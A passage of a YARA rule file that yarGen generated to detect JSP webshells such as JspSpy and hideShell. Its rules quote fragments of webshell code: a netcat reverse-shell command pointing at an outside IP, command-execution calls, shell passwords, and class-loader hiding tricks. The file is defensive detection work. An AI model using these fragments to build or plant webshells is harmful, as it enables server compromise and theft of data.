      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "9e510dffd01cef28047043c0331f408279042cf724c8d2a76968e5eb40446caa"
   strings:
      $x1 = "<td><span style=\\\"float:right;\\\"><a href=\\\"http://www.forjj.com\\\" target=\\\"_blank\\\">JspSpy Ver: 2010 </a></span>\"+r" ascii
      $x2 = "program = \"cmd.exe /c net start > \"+SHELL_DIR+\"/Log.txt\";" fullword ascii
      $x3 = "table.append(\"<b style='color:red;margin-left:15px'><i> View Struct </i></b> - <a href=\\\"javascript:doPost({o:'executesql'})" ascii
      $x4 = "table.append(\"<b style='color:red;margin-left:15px'><i> View Struct </i></b> - <a href=\\\"javascript:doPost({o:'executesql'})" ascii
      $x5 = "\"<!--<span style=\\\"font:11px Verdana;\\\">Copyright &copy; 2010 NinTy </span><a href=\\\"http://www.forjj.com\\\" target=\\\"" ascii
      $x6 = "<td><span style=\\\"float:right;\\\"><a href=\\\"http://www.forjj.com\\\" target=\\\"_blank\\\">JspSpy Ver: 2010 </a></span>\"+r" ascii
      $s7 = "<input type=\\\"text\\\" name=\\\"exe\\\" style=\\\"width:300px\\\" class=\\\"input\\\" value=\\\"\"+(ISLINUX ? \"/bin/bash\" :" ascii
      $s8 = "out.println(\"<html><head><title>JspSpy Private Codz By - Ninty</title><style type=\\\"text/css\\\">\"+" fullword ascii
      $s9 = "response.getWriter().println(\"<div style=\\\"padding:10px;border-bottom:1px solid #fff;border-top:1px solid #ddd;background:#ee" ascii
      $s10 = "table.append(\"<td nowrap> <a href=\\\"#\\\" onclick=\\\"view('\"+tbName+\"')\\\">View</a> | <a href=\\\"javascript:doPost({o:'e" ascii
      $s11 = "((Invoker)ins.get(\"vLogin\")).invoke(request,response,JSession);" fullword ascii
      $s12 = "((Invoker)ins.get(\"login\")).invoke(request,response,session);" fullword ascii
      $s13 = "response.setHeader(\"Content-Disposition\",\"attachment;filename=DataExport.txt\");" fullword ascii
      $s14 = "((Invoker)ins.get(\"vLogin\")).invoke(request,response,session);" fullword ascii
      $s15 = "\"<!--<span style=\\\"font:11px Verdana;\\\">Copyright &copy; 2010 NinTy </span><a href=\\\"http://www.forjj.com\\\" target=\\\"" ascii
      $s16 = "\">Copyright (C) 2010 <a href=\\\"http://www.forjj.com\\\" target=\\\"_blank\\\">http://www.Forjj.com/</a>&nbsp;&nbsp;<a target=" ascii
      $s17 = "\"<p><input type=\\\"hidden\\\" name=\\\"selectDb\\\" value=\\\"\"+selectDb+\"\\\"><input type=\\\"hidden\\\" name=\\\"o\\\" val" ascii
      $s18 = "<!--<a href=\\\"javascript:alert('not support yet');\\\">Http Proxy</a> | -->\"+" fullword ascii
      $s19 = "((Invoker)ins.get(\"script\")).invoke(request,response,session);" fullword ascii
      $s20 = "table.append(\"<td nowrap> <a href=\\\"#\\\" onclick=\\\"view('\"+tbName+\"')\\\">View</a> | <a href=\\\"javascript:doPost({o:'e" ascii
   condition:
      uint16(0) == 0x253c and filesize < 400KB and
      1 of ($x*) and 4 of them
}

rule queryDong {
   meta:
      description = "webshell - file queryDong.jsp"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "9b3677edc3dc6cf868b8c62166ed9db5062891501b3776876ea95a7e8884db72"
   strings:
      $x1 = "<td><span style=\\\"float:right;\\\"><a href=\\\"http://www.forjj.com\\\" target=\\\"_blank\\\">JspSpy Ver: 2010 </a></span>\"+r" ascii
      $x2 = "program = \"cmd.exe /c net start > \"+SHELL_DIR+\"/Log.txt\";" fullword ascii
      $x3 = "table.append(\"<b style='color:red;margin-left:15px'><i> View Struct </i></b> - <a href=\\\"javascript:doPost({o:'executesql'})" ascii
      $x4 = "table.append(\"<b style='color:red;margin-left:15px'><i> View Struct </i></b> - <a href=\\\"javascript:doPost({o:'executesql'})" ascii
      $x5 = "\"<!--<span style=\\\"font:11px Verdana;\\\">Copyright &copy; 2010 NinTy </span><a href=\\\"http://www.forjj.com\\\" target=\\\"" ascii
      $x6 = "<td><span style=\\\"float:right;\\\"><a href=\\\"http://www.forjj.com\\\" target=\\\"_blank\\\">JspSpy Ver: 2010 </a></span>\"+r" ascii
      $s7 = "<input type=\\\"text\\\" name=\\\"exe\\\" style=\\\"width:300px\\\" class=\\\"input\\\" value=\\\"\"+(ISLINUX ? \"/bin/bash\" :" ascii
      $s8 = "out.println(\"<html><head><title>JspSpy Private Codz By - Ninty</title><style type=\\\"text/css\\\">\"+" fullword ascii
      $s9 = "response.getWriter().println(\"<div style=\\\"padding:10px;border-bottom:1px solid #fff;border-top:1px solid #ddd;background:#ee" ascii
      $s10 = "table.append(\"<td nowrap> <a href=\\\"#\\\" onclick=\\\"view('\"+tbName+\"')\\\">View</a> | <a href=\\\"javascript:doPost({o:'e" ascii
      $s11 = "((Invoker)ins.get(\"vLogin\")).invoke(request,response,JSession);" fullword ascii
      $s12 = "((Invoker)ins.get(\"login\")).invoke(request,response,session);" fullword ascii
      $s13 = "response.setHeader(\"Content-Disposition\",\"attachment;filename=DataExport.txt\");" fullword ascii
      $s14 = "((Invoker)ins.get(\"vLogin\")).invoke(request,response,session);" fullword ascii
      $s15 = "\"<!--<span style=\\\"font:11px Verdana;\\\">Copyright &copy; 2010 NinTy </span><a href=\\\"http://www.forjj.com\\\" target=\\\"" ascii
      $s16 = "\">Copyright (C) 2010 <a href=\\\"http://www.forjj.com\\\" target=\\\"_blank\\\">http://www.Forjj.com/</a>&nbsp;&nbsp;<a target=" ascii
      $s17 = "\"<p><input type=\\\"hidden\\\" name=\\\"selectDb\\\" value=\\\"\"+selectDb+\"\\\"><input type=\\\"hidden\\\" name=\\\"o\\\" val" ascii
      $s18 = "<!--<a href=\\\"javascript:alert('not support yet');\\\">Http Proxy</a> | -->\"+" fullword ascii
      $s19 = "((Invoker)ins.get(\"script\")).invoke(request,response,session);" fullword ascii
      $s20 = "table.append(\"<td nowrap> <a href=\\\"#\\\" onclick=\\\"view('\"+tbName+\"')\\\">View</a> | <a href=\\\"javascript:doPost({o:'e" ascii
   condition:
      uint16(0) == 0x253c and filesize < 400KB and
      1 of ($x*) and 4 of them
}

rule webshell_jsp_000 {
   meta:
      description = "webshell - file 000.jsp"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "2424ea073fb98b85c26b9fd47bc8cfe5008504fd7ab80de428b75c296f3dd114"
   strings:
      $x1 = "<td><span style=\\\"float:right;\\\"><a href=\\\"http://www.forjj.com\\\" target=\\\"_blank\\\">JspSpy Ver: 2010 </a></span>\"+r" ascii
      $x2 = "program = \"cmd.exe /c net start > \"+SHELL_DIR+\"/Log.txt\";" fullword ascii
      $x3 = "table.append(\"<b style='color:red;margin-left:15px'><i> View Struct </i></b> - <a href=\\\"javascript:doPost({o:'executesql'})" ascii
      $x4 = "table.append(\"<b style='color:red;margin-left:15px'><i> View Struct </i></b> - <a href=\\\"javascript:doPost({o:'executesql'})" ascii
      $x5 = "\"<!--<span style=\\\"font:11px Verdana;\\\">Copyright &copy; 2010 NinTy </span><a href=\\\"http://www.forjj.com\\\" target=\\\"" ascii
      $x6 = "<td><span style=\\\"float:right;\\\"><a href=\\\"http://www.forjj.com\\\" target=\\\"_blank\\\">JspSpy Ver: 2010 </a></span>\"+r" ascii
      $s7 = "<input type=\\\"text\\\" name=\\\"exe\\\" style=\\\"width:300px\\\" class=\\\"input\\\" value=\\\"\"+(ISLINUX ? \"/bin/bash\" :" ascii
      $s8 = "out.println(\"<html><head><title>JspSpy Private Codz By - Ninty</title><style type=\\\"text/css\\\">\"+" fullword ascii
      $s9 = "response.getWriter().println(\"<div style=\\\"padding:10px;border-bottom:1px solid #fff;border-top:1px solid #ddd;background:#ee" ascii
      $s10 = "table.append(\"<td nowrap> <a href=\\\"#\\\" onclick=\\\"view('\"+tbName+\"')\\\">View</a> | <a href=\\\"javascript:doPost({o:'e" ascii
      $s11 = "((Invoker)ins.get(\"vLogin\")).invoke(request,response,JSession);" fullword ascii
      $s12 = "((Invoker)ins.get(\"login\")).invoke(request,response,session);" fullword ascii
      $s13 = "response.setHeader(\"Content-Disposition\",\"attachment;filename=DataExport.txt\");" fullword ascii
      $s14 = "((Invoker)ins.get(\"vLogin\")).invoke(request,response,session);" fullword ascii
      $s15 = "\"<!--<span style=\\\"font:11px Verdana;\\\">Copyright &copy; 2010 NinTy </span><a href=\\\"http://www.forjj.com\\\" target=\\\"" ascii
      $s16 = "\">Copyright (C) 2010 <a href=\\\"http://www.forjj.com\\\" target=\\\"_blank\\\">http://www.Forjj.com/</a>&nbsp;&nbsp;<a target=" ascii
      $s17 = "\"<p><input type=\\\"hidden\\\" name=\\\"selectDb\\\" value=\\\"\"+selectDb+\"\\\"><input type=\\\"hidden\\\" name=\\\"o\\\" val" ascii
      $s18 = "<!--<a href=\\\"javascript:alert('not support yet');\\\">Http Proxy</a> | -->\"+" fullword ascii
      $s19 = "((Invoker)ins.get(\"script\")).invoke(request,response,session);" fullword ascii
      $s20 = "table.append(\"<td nowrap> <a href=\\\"#\\\" onclick=\\\"view('\"+tbName+\"')\\\">View</a> | <a href=\\\"javascript:doPost({o:'e" ascii
   condition:
      uint16(0) == 0x253c and filesize < 400KB and
      1 of ($x*) and 4 of them
}

rule spyjsp2010 {
   meta:
      description = "webshell - file spyjsp2010.jsp"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "410bf542ec9d693517486e33e7f45955d2a06f77f195e847c74ac3dcacf6a677"
   strings:
      $x1 = "<td><span style=\\\"float:right;\\\"><a href=\\\"http://www.forjj.com\\\" target=\\\"_blank\\\">JspSpy Ver: 2010 </a></span>\"+r" ascii
      $x2 = "program = \"cmd.exe /c net start > \"+SHELL_DIR+\"/Log.txt\";" fullword ascii
      $x3 = "table.append(\"<b style='color:red;margin-left:15px'><i> View Struct </i></b> - <a href=\\\"javascript:doPost({o:'executesql'})" ascii
      $x4 = "table.append(\"<b style='color:red;margin-left:15px'><i> View Struct </i></b> - <a href=\\\"javascript:doPost({o:'executesql'})" ascii
      $x5 = "\"<!--<span style=\\\"font:11px Verdana;\\\">Copyright &copy; 2010 NinTy </span><a href=\\\"http://www.forjj.com\\\" target=\\\"" ascii
      $x6 = "<td><span style=\\\"float:right;\\\"><a href=\\\"http://www.forjj.com\\\" target=\\\"_blank\\\">JspSpy Ver: 2010 </a></span>\"+r" ascii
      $s7 = "<input type=\\\"text\\\" name=\\\"exe\\\" style=\\\"width:300px\\\" class=\\\"input\\\" value=\\\"\"+(ISLINUX ? \"/bin/bash\" :" ascii
      $s8 = "out.println(\"<html><head><title>JspSpy Private Codz By - Ninty</title><style type=\\\"text/css\\\">\"+" fullword ascii
      $s9 = "response.getWriter().println(\"<div style=\\\"padding:10px;border-bottom:1px solid #fff;border-top:1px solid #ddd;background:#ee" ascii
      $s10 = "table.append(\"<td nowrap> <a href=\\\"#\\\" onclick=\\\"view('\"+tbName+\"')\\\">View</a> | <a href=\\\"javascript:doPost({o:'e" ascii
      $s11 = "((Invoker)ins.get(\"vLogin\")).invoke(request,response,JSession);" fullword ascii
      $s12 = "((Invoker)ins.get(\"login\")).invoke(request,response,session);" fullword ascii
      $s13 = "response.setHeader(\"Content-Disposition\",\"attachment;filename=DataExport.txt\");" fullword ascii
      $s14 = "((Invoker)ins.get(\"vLogin\")).invoke(request,response,session);" fullword ascii
      $s15 = "\"<!--<span style=\\\"font:11px Verdana;\\\">Copyright &copy; 2010 NinTy </span><a href=\\\"http://www.forjj.com\\\" target=\\\"" ascii
      $s16 = "\">Copyright (C) 2010 <a href=\\\"http://www.forjj.com\\\" target=\\\"_blank\\\">http://www.Forjj.com/</a>&nbsp;&nbsp;<a target=" ascii
      $s17 = "\"<p><input type=\\\"hidden\\\" name=\\\"selectDb\\\" value=\\\"\"+selectDb+\"\\\"><input type=\\\"hidden\\\" name=\\\"o\\\" val" ascii
      $s18 = "<!--<a href=\\\"javascript:alert('not support yet');\\\">Http Proxy</a> | -->\"+" fullword ascii
      $s19 = "((Invoker)ins.get(\"script\")).invoke(request,response,session);" fullword ascii
      $s20 = "table.append(\"<td nowrap> <a href=\\\"#\\\" onclick=\\\"view('\"+tbName+\"')\\\">View</a> | <a href=\\\"javascript:doPost({o:'e" ascii
   condition:
      uint16(0) == 0xbbef and filesize < 400KB and
      1 of ($x*) and 4 of them
}

rule webshell_jsp_myxx1 {
   meta:
      description = "webshell - file myxx1.jsp"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "a5b67b8b8617fd8f2cff76399aa8782813bb29f06c9b6b444db8617a65a0771c"
   strings:
      $x1 = "program = \"cmd.exe /c net start > \" + SHELL_DIR" fullword ascii
      $x2 = "<option value=\\\"nc -e cmd.exe 192.168.230.1 4444\\\">nc</option>\"" fullword ascii
      $x3 = ": \"c:\\\\windows\\\\system32\\\\cmd.exe\")" fullword ascii
      $x4 = "<a href=\\\"javascript:doPost({o:'vs'});\\\">Execute Command</a> | \"" fullword ascii
      $s5 = ".append(\"<b style='color:red;margin-left:15px'><i> View Struct </i></b> - <a href=\\\"javascript:doPost({o:'executesql'})\\\">V" ascii
      $s6 = ".append(\"<b style='color:red;margin-left:15px'><i> View Struct </i></b> - <a href=\\\"javascript:doPost({o:'executesql'})\\\">V" ascii
      $s7 = "ins.put(\"executesql\", new ExecuteSQLInvoker());" fullword ascii
      $s8 = "Object obj = ((DBOperator) dbo).execute(sql);" fullword ascii
      $s9 = "((Invoker) ins.get(\"vLogin\")).invoke(request, response," fullword ascii
      $s10 = "((Invoker) ins.get(\"login\")).invoke(request, response," fullword ascii
      $s11 = "+ \"')\\\">View</a> | <a href=\\\"javascript:doPost({o:'executesql',type:'struct',table:'\"" fullword ascii
      $s12 = "+ (JSession.getAttribute(CURRENT_DIR).toString() + \"/exportdata.txt\")" fullword ascii
      $s13 = "ins.put(\"login\", new LoginInvoker());" fullword ascii
      $s14 = "<!--<a href=\\\"javascript:alert('not support yet');\\\">Http Proxy</a> | -->\"" fullword ascii
      $s15 = "ins.put(\"vLogin\", new VLoginInvoker());" fullword ascii
      $s16 = "+ \"<h2>Execute Shell &raquo;</h2>\"" fullword ascii
      $s17 = "<a href=\\\"javascript:doPost({o:'vd'});\\\">Download Remote File</a> | \"" fullword ascii
      $s18 = "StreamConnector.readFromRemote(targetS, yourS," fullword ascii
      $s19 = "+ \"\\\" method=\\\"post\\\" onsubmit=\\\"this.submit();$('cmd').value='';return false;\\\" target=\\\"asyn\\\">\"" fullword ascii
      $s20 = "+ \"\\\" method=\\\"post\\\" target=\\\"echo\\\" onsubmit=\\\"$('cmd').focus()\\\">\"" fullword ascii
   condition:
      uint16(0) == 0x253c and filesize < 400KB and
      1 of ($x*) and 4 of them
}

rule webshell_jsp_config {
   meta:
      description = "webshell - file config.jsp"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "5deda28b47b16d083c40e0fecdf617de7e645a7b06a053a572c6e2702dc8577b"
   strings:
      $x1 = "program = \"cmd.exe /c net start > \" + SHELL_DIR" fullword ascii
      $x2 = "<option value=\\\"nc -e cmd.exe 192.168.230.1 4444\\\">nc</option>\"" fullword ascii
      $x3 = ": \"c:\\\\windows\\\\system32\\\\cmd.exe\")" fullword ascii
      $x4 = "<a href=\\\"javascript:doPost({o:'vs'});\\\">Execute Command</a> | \"" fullword ascii
      $s5 = ".append(\"<b style='color:red;margin-left:15px'><i> View Struct </i></b> - <a href=\\\"javascript:doPost({o:'executesql'})\\\">V" ascii
      $s6 = ".append(\"<b style='color:red;margin-left:15px'><i> View Struct </i></b> - <a href=\\\"javascript:doPost({o:'executesql'})\\\">V" ascii
      $s7 = "ins.put(\"executesql\", new ExecuteSQLInvoker());" fullword ascii
      $s8 = "Object obj = ((DBOperator) dbo).execute(sql);" fullword ascii
      $s9 = "((Invoker) ins.get(\"vLogin\")).invoke(request, response," fullword ascii
      $s10 = "((Invoker) ins.get(\"login\")).invoke(request, response," fullword ascii
      $s11 = "+ \"')\\\">View</a> | <a href=\\\"javascript:doPost({o:'executesql',type:'struct',table:'\"" fullword ascii
      $s12 = "+ (JSession.getAttribute(CURRENT_DIR).toString() + \"/exportdata.txt\")" fullword ascii
      $s13 = "ins.put(\"login\", new LoginInvoker());" fullword ascii
      $s14 = "<!--<a href=\\\"javascript:alert('not support yet');\\\">Http Proxy</a> | -->\"" fullword ascii
      $s15 = "ins.put(\"vLogin\", new VLoginInvoker());" fullword ascii
      $s16 = "+ \"<h2>Execute Shell &raquo;</h2>\"" fullword ascii
      $s17 = "<a href=\\\"javascript:doPost({o:'vd'});\\\">Download Remote File</a> | \"" fullword ascii
      $s18 = "StreamConnector.readFromRemote(targetS, yourS," fullword ascii
      $s19 = "+ \"\\\" method=\\\"post\\\" onsubmit=\\\"this.submit();$('cmd').value='';return false;\\\" target=\\\"asyn\\\">\"" fullword ascii
      $s20 = "+ \"\\\" method=\\\"post\\\" target=\\\"echo\\\" onsubmit=\\\"$('cmd').focus()\\\">\"" fullword ascii
   condition:
      uint16(0) == 0x253c and filesize < 400KB and
      1 of ($x*) and 4 of them
}

rule webshell_jsp_zend {
   meta:
      description = "webshell - file zend.jsp"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "e26e617b9e9b77f4578f8737e3463c18210855626b4aca49d465be65f59e97d1"
   strings:
      $x1 = "program = \"cmd.exe /c net start > \" + SHELL_DIR" fullword ascii
      $x2 = "<option value=\\\"nc -e cmd.exe 192.168.230.1 4444\\\">nc</option>\"" fullword ascii
      $x3 = ": \"c:\\\\windows\\\\system32\\\\cmd.exe\")" fullword ascii
      $x4 = "<a href=\\\"javascript:doPost({o:'vs'});\\\">Execute Command</a> | \"" fullword ascii
      $s5 = ".append(\"<b style='color:red;margin-left:15px'><i> View Struct </i></b> - <a href=\\\"javascript:doPost({o:'executesql'})\\\">V" ascii
      $s6 = ".append(\"<b style='color:red;margin-left:15px'><i> View Struct </i></b> - <a href=\\\"javascript:doPost({o:'executesql'})\\\">V" ascii
      $s7 = "ins.put(\"executesql\", new ExecuteSQLInvoker());" fullword ascii
      $s8 = "Object obj = ((DBOperator) dbo).execute(sql);" fullword ascii
      $s9 = "((Invoker) ins.get(\"vLogin\")).invoke(request, response," fullword ascii
      $s10 = "((Invoker) ins.get(\"login\")).invoke(request, response," fullword ascii
      $s11 = "+ \"')\\\">View</a> | <a href=\\\"javascript:doPost({o:'executesql',type:'struct',table:'\"" fullword ascii
      $s12 = "+ (JSession.getAttribute(CURRENT_DIR).toString() + \"/exportdata.txt\")" fullword ascii
      $s13 = "ins.put(\"login\", new LoginInvoker());" fullword ascii
      $s14 = "<!--<a href=\\\"javascript:alert('not support yet');\\\">Http Proxy</a> | -->\"" fullword ascii
      $s15 = "ins.put(\"vLogin\", new VLoginInvoker());" fullword ascii
      $s16 = "+ \"<h2>Execute Shell &raquo;</h2>\"" fullword ascii
      $s17 = "<a href=\\\"javascript:doPost({o:'vd'});\\\">Download Remote File</a> | \"" fullword ascii
      $s18 = "StreamConnector.readFromRemote(targetS, yourS," fullword ascii
      $s19 = "+ \"\\\" method=\\\"post\\\" onsubmit=\\\"this.submit();$('cmd').value='';return false;\\\" target=\\\"asyn\\\">\"" fullword ascii
      $s20 = "+ \"\\\" method=\\\"post\\\" target=\\\"echo\\\" onsubmit=\\\"$('cmd').focus()\\\">\"" fullword ascii
   condition:
      uint16(0) == 0x253c and filesize < 400KB and
      1 of ($x*) and 4 of them
}

rule hideShell {
   meta:
      description = "webshell - file hideShell.jsp"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "95e97a480447aa0ab0e679af117178e56490d9fb7b4b9ec0ed26efbeede56eb3"
   strings:
      $s1 = "public static JspServletWrapper getHideShellWrapper(HttpServletRequest request, JspRuntimeContext jctxt) {" fullword ascii
      $s2 = "JspCompilationContext ctxt = evil.getJspEngineContext();" fullword ascii
      $s3 = "<a href='<%=entry.getKey() %>'> <%=entry.getKey() %></a> possible hidden file,  <a href='?action=delete&wrapperName=<%=entry.get" ascii
      $s4 = "AccessLogAdapter accessLog = (AccessLogAdapter)host.getAccessLog();" fullword ascii
      $s5 = "cls = new SpyClassLoader(this.getClass().getClassLoader(), bytes, out).loadClass(clsName);" fullword ascii
      $s6 = "cls = new SpyClassLoader(this.getClass().getClassLoader(), null, out).defineClass(clsName, bytes);" fullword ascii
      $s7 = "public AttachingWrapper(JspServletWrapper original, JspServletWrapper evil, ServletConfig config, org.apache.jasper.Options opti" ascii
      $s8 = "private void processZip() throws Exception {" fullword ascii
      $s9 = "this.processZip();" fullword ascii
      $s10 = "public AttachingWrapper(JspServletWrapper original, JspServletWrapper evil, ServletConfig config, org.apache.jasper.Options opti" ascii
      $s11 = "this.evil.service(request, response, precompile);" fullword ascii
      $s12 = "private static class SpyClassLoader extends ClassLoader{" fullword ascii
      $s13 = "<%@page import=\"java.awt.SystemColor\"%>" fullword ascii
      $s14 = "public SpyClassLoader(ClassLoader parent,  byte[] zipdata, JspWriter out) throws Exception {" fullword ascii
      $s15 = "jctxt.addWrapper(hiddenWrapperName, getHideShellWrapper(request, jctxt));" fullword ascii
      $s16 = "this.setTargetOutput(stream);" fullword ascii
      $s17 = "jctxt.addWrapper(path, getHideShellWrapper(request, jctxt));" fullword ascii
      $s18 = "JspServletWrapper evil = jctxt.getWrapper(wrapperName);" fullword ascii
      $s19 = "<%@page import=\"org.apache.jasper.compiler.JspRuntimeContext\"%>" fullword ascii
      $s20 = "<a href='<%=entry.getKey() %>'> <%=entry.getKey() %></a> possible hidden file,  <a href='?action=delete&wrapperName=<%=entry.get" ascii
   condition:
      uint16(0) == 0x253c and filesize < 40KB and
      8 of them
}

rule jspspy_k8 {
   meta:
      description = "webshell - file jspspy_k8.jsp"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "9ce81cfc056822ec9962aa8d6ca2233ac56e26a10f96cddc117d89b73a14c060"
   strings:
      $x1 = "<td><span style=\\\"float:right;\\\"><a href=\\\"http://www.baidu.com\\\" target=\\\"_blank\\\">JspSpy Ver: 2009</a></span>\"+re" ascii
      $x2 = "<td><span style=\\\"float:right;\\\"><a href=\\\"http://www.baidu.com\\\" target=\\\"_blank\\\">JspSpy Ver: 2009</a></span>\"+re" ascii
      $s3 = "response.getWriter().println(\"<div style=\\\"padding:10px;border-bottom:1px solid #fff;border-top:1px solid #ddd;background:#ee" ascii
      $s4 = "\">Copyright (C) 2009 <a href=\\\"http://www.baidu.com\\\" target=\\\"_blank\\\">http://www.baidu.com/</a>&nbsp;&nbsp;<a target=" ascii
      $s5 = "\"<span style=\\\"font:11px Verdana;\\\">Copyright &copy; 2012 Admin </span><a href=\\\"http://www.baidu.com\\\" target=\\\"_bla" ascii
      $s6 = "\"<span style=\\\"font:11px Verdana;\\\">Copyright &copy; 2012 Admin </span><a href=\\\"http://www.baidu.com\\\" target=\\\"_bla" ascii
      $s7 = "remoteIP = \"www.baidu.com\";" fullword ascii
      $s8 = "url = \"http://www.baidu.com/\";" fullword ascii
      $s9 = "\" href=\\\"http://www.baidu.com/\\\">[T00ls.Net]</a> All Rights Reserved.\"+" fullword ascii
      $s10 = "idu.com</a></p>\"+" fullword ascii
      $s11 = "out.println(\"<html><head><title> </title><style type=\\\"text/css\\\">\"+" fullword ascii
      $s12 = "private static final String PW = \"k8\"; " fullword ascii
      $s13 = "<%@page pageEncoding=\"UTF-8\"%>" fullword ascii
   condition:
      uint16(0) == 0x253c and filesize < 200KB and
      1 of ($x*) and 4 of them
}

rule webshell_jsp_jspspy {
   meta:
      description = "webshell - file jspspy.jsp"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "09662e5f79e84781ecb6b508794e52a578726229cc2e37be676cfba5e8751d1a"
   strings:
      $x1 = "<td><span style=\\\"float:right;\\\"><a href=\\\"http://www.baidu.com\\\" target=\\\"_blank\\\">JspSpy Ver: 2009</a></span>\"+re" ascii
      $x2 = "<td><span style=\\\"float:right;\\\"><a href=\\\"http://www.baidu.com\\\" target=\\\"_blank\\\">JspSpy Ver: 2009</a></span>\"+re" ascii
      $s3 = "response.getWriter().println(\"<div style=\\\"padding:10px;border-bottom:1px solid #fff;border-top:1px solid #ddd;background:#ee" ascii
      $s4 = "* Blog http://www.baidu.com/" fullword ascii
      $s5 = "\">Copyright (C) 2009 <a href=\\\"http://www.baidu.com\\\" target=\\\"_blank\\\">http://www.baidu.com/</a>&nbsp;&nbsp;<a target=" ascii
      $s6 = "\"<span style=\\\"font:11px Verdana;\\\">Copyright &copy; 2012 Admin </span><a href=\\\"http://www.baidu.com\\\" target=\\\"_bla" ascii
      $s7 = "\"<span style=\\\"font:11px Verdana;\\\">Copyright &copy; 2012 Admin </span><a href=\\\"http://www.baidu.com\\\" target=\\\"_bla" ascii
      $s8 = "remoteIP = \"www.baidu.com\";" fullword ascii
      $s9 = "url = \"http://www.baidu.com/\";" fullword ascii
      $s10 = "\" href=\\\"http://www.baidu.com/\\\">[T00ls.Net]</a> All Rights Reserved.\"+" fullword ascii
      $s11 = "private static final String PW = \"max\"; //password" fullword ascii
      $s12 = "idu.com</a></p>\"+" fullword ascii
      $s13 = "* Code By admin" fullword ascii
      $s14 = "* Huan . I Love You." fullword ascii
      $s15 = "<%@page pageEncoding=\"UTF-8\"%>" fullword ascii
   condition:
      uint16(0) == 0x253c and filesize < 200KB and
      1 of ($x*) and 4 of them
}

rule webshell_jsp_warn {
   meta:
      description = "webshell - file warn.jsp"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "4c392fe2056ff0333b35b75033c79c593135b7f14f70f77a5bb9bc842f24c95e"
   strings:
      $x1 = "Process p=Runtime.getRuntime().exec(strCommand,null,new File(strDir));" fullword ascii
      $s2 = "Hashtable ht = parser.processData(request.getInputStream(), bound, tempdir, clength);" fullword ascii
      $s3 = "out.println(\"<table border='1' width='100%' bgcolor='#FBFFC6' cellspacing=0 cellpadding=5 bordercolorlight=#000000 bordercolord" ascii
      $s4 = "sbFolder.append(\"<tr><td >&nbsp;</td><td><a href=\\\"javascript:doForm('','\"+formatPath(objFile.getParentFile().getAbsolutePat" ascii
      $s5 = "sbFile.append(\" &nbsp;<a href=\\\"javascript:doForm('del','\"+formatPath(strDir)+\"','\"+list[i].getName()+\"','\"+strCmd+\"','" ascii
      $s6 = "sbFile.append(\" &nbsp;<a href=\\\"javascript:doForm('edit','\"+formatPath(strDir)+\"','\"+list[i].getName()+\"','\"+strCmd+\"'," ascii
      $s7 = "sbFile.append(\" &nbsp;<a href=\\\"javascript:doForm('del','\"+formatPath(strDir)+\"','\"+list[i].getName()+\"','\"+strCmd+\"','" ascii
      $s8 = "sbFile.append(\"  &nbsp;<a href=\\\"javascript:doForm('copy','\"+formatPath(strDir)+\"','\"+list[i].getName()+\"','\"+strCmd+\"'" ascii
      $s9 = "sbFile.append(\"  &nbsp;<a href=\\\"javascript:doForm('down','\"+formatPath(strDir)+\"','\"+list[i].getName()+\"','\"+strCmd+\"'" ascii
      $s10 = "sbFile.append(\"  &nbsp;<a href=\\\"javascript:doForm('down','\"+formatPath(strDir)+\"','\"+list[i].getName()+\"','\"+strCmd+\"'" ascii
      $s11 = "sbFile.append(\" &nbsp;<a href=\\\"javascript:doForm('edit','\"+formatPath(strDir)+\"','\"+list[i].getName()+\"','\"+strCmd+\"'," ascii
      $s12 = "sbFolder.append(\"  <a href=\\\"javascript:doForm('','\"+formatPath(list[i].getAbsolutePath())+\"','','\"+strCmd+\"','1','');" ascii
      $s13 = "sbFile.append(\"  &nbsp;<a href=\\\"javascript:doForm('copy','\"+formatPath(strDir)+\"','\"+list[i].getName()+\"','\"+strCmd+\"'" ascii
      $s14 = "System.out.println(strCommand);" fullword ascii
      $s15 = "sbSaveCopy.append(\"<p><font color=red>target file exists, copy failed.</font>\");" fullword ascii
      $s16 = "sbSaveCopy.append(\"<p><font color=red>target file error</font>\");" fullword ascii
      $s17 = "sbFolder.append(\"<tr><td >&nbsp;</td><td><a href=\\\"javascript:doForm('','\"+formatPath(objFile.getParentFile().getAbsolutePat" ascii
      $s18 = "<li><a href=\"http://www.topronet.com\" class=\"current\" onClick=\"return expandcontent('menu1', this)\"> <%=strFileManage[lang" ascii
      $s19 = "<li><a href=\"http://www.topronet.com\" class=\"current\" onClick=\"return expandcontent('menu1', this)\"> <%=strFileManage[lang" ascii
      $s20 = "response.setHeader(\"content-type\",\"text/html; charset=ISO-8859-1\");" fullword ascii
   condition:
      uint16(0) == 0x253c and filesize < 90KB and
      1 of ($x*) and 4 of them
}

rule index_bak1 {
   meta:
      description = "webshell - file index_bak1.jsp"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "f9eb64c48791e1ee5226c6ef0e733b75240721a099fff860c7e2f28e5191c906"
   strings:
      $s1 = "t=t=t=t=t=t=t=<%@page import=\"java.io.*,java.util.*,java.net.*,java.sql.*,java.text.*\"%>" fullword ascii
      $s2 = "String Pwd=\"cmd\";" fullword ascii
   condition:
      uint16(0) == 0x3d74 and filesize < 20KB and
      all of them
}

rule webshell_jsp_m {
   meta:
      description = "webshell - file m.jsp"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
